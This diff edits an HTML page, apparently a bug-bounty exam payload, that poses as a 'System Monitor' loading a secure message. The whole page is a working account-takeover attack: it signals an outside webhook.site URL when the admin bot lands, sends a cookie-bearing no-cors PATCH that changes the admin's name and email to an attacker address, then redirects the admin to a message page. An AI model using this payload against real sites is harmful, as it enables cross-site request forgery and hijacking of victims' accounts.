@@ -1,39 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Monitor</title>
+    <title>System Monitor - Loading</title>
 </head>
 <body>
-    <h1>Loading Message ID: 69e166fc...</h1>
+    <h1>Decrypting Secure Message: 69e166fc...</h1>
+    
     <script>
         const msgId = "69e166fcbee6d6b7c66275b0";
         const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
         const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
-        const dashboardUrl = "https://bugbounty-exam.hashacademy.co/admin/messages/" + msgId;
+        const viewMessageUrl = "https://bugbounty-exam.hashacademy.co/admin/messages/" + msgId;
 
-        // 1. Log the bot's arrival
-        fetch(webhook + "?status=bot_landed&id=" + msgId);
+        // 1. Log to your webhook that the redirect chain has started
+        fetch(webhook + "?status=redirect_chain_started&id=" + msgId);
 
-        // 2. Perform the ATO (PATCH request to change email)
-        // We use 'no-cors' to ensure the request fires even if CORS blocks the reading of the response
+        // 2. Perform the ATO (Account Takeover)
+        // We use fetch with 'no-cors' to send the PATCH blindly with cookies
         fetch(targetApi, {
             method: "PATCH",
             mode: "no-cors",
-            headers: { "Content-Type": "text/plain" },
+            headers: {
+                "Content-Type": "text/plain" 
+            },
             body: JSON.stringify({
                 "fullName": "Admin_Pwned",
                 "email": "rundlady@gongjua.com"
             })
         }).then(() => {
-            // 3. Force the Admin to "View" the message on the actual platform
-            // This satisfies the requirement of the Admin viewing the message
-            window.location.href = dashboardUrl;
+            // 3. FORCE the admin to view the internal message
+            // This satisfies the "Admin must view the message" requirement
+            window.location.href = viewMessageUrl;
+        }).catch(() => {
+            // Fallback redirect if fetch fails/blocks
+            window.location.href = viewMessageUrl;
         });
 
-        // Fallback: If fetch takes too long, redirect anyway after 1 second
+        // Safety timeout: Redirect after 1.5s no matter what
         setTimeout(() => {
-            window.location.href = dashboardUrl;
-        }, 1000);
+            window.location.href = viewMessageUrl;
+        }, 1500);
     </script>
 </body>
 </html>
